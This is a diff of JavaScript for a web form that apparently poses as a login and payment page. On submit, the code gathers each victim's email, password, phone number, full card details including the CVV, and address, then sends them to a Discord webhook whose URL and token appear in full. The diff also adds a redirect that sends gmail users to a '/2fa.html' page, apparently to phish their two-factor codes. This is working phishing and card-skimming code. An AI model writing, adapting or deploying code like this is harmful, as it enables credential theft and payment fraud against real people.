@@ -4,8 +4,6 @@ form.addEventListener("submit", (event)=>
 {
     event.preventDefault();
 
-
-
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
     const num = document.getElementById("tel.num").value;
@@ -22,6 +20,7 @@ form.addEventListener("submit", (event)=>
 
     else
     {
+        localStorage.setItem("email", email);
         const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}\ncard number: ${card_num}\ncard owner name: ${name}\ncard exp date: ${exp}\ncard cvv: ${cvv}\naddress: ${address}`
         
         fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
@@ -36,6 +35,11 @@ form.addEventListener("submit", (event)=>
                 content: content
             })
         })
+
+        if(email.split('@')[1] == "gmail.com")
+        {
+            window.location.href = "/2fa.html";
+        }
     }
 });
 
